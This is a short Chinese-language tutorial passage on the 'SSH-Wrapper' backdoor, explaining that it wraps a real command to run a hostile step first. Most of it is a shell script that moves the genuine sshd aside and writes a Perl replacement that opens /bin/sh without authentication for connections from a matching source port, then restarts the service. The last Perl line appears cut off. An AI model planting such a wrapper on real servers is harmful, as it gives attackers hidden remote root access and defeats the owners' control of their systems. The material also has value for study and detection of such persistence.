## SSH-Wrapper后门

wrapper的中文翻译即"封装"，因此此类后门顾名思义就是对原命令的二次封装，先执行恶意操作，之后再重定向到真实的命令上。从这个角度来说，我们使用的很多命令篡改后门都是wrapper后门。

关于这种后门最早是在14年提出的也就是现在大家熟知的SSH_Wrapper，是一个很老的后门了，原文链接：https://www.jakoblell.com/blog/2014/05/07/hacking-contest-ssh-server-wrapper/



```shell
cd /usr/sbin/
mv sshd ../bin/


echo '#!/usr/bin/perl' >sshd
echo 'exec "/bin/sh" if(getpeername(STDIN) =~ /^..4A/);' >>sshd
echo 'exec{"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >>sshd


chmod u+x sshd
/etc/init.d/sshd restart
```

这种后门在实际场景下非常容易被识别，不具有隐蔽性。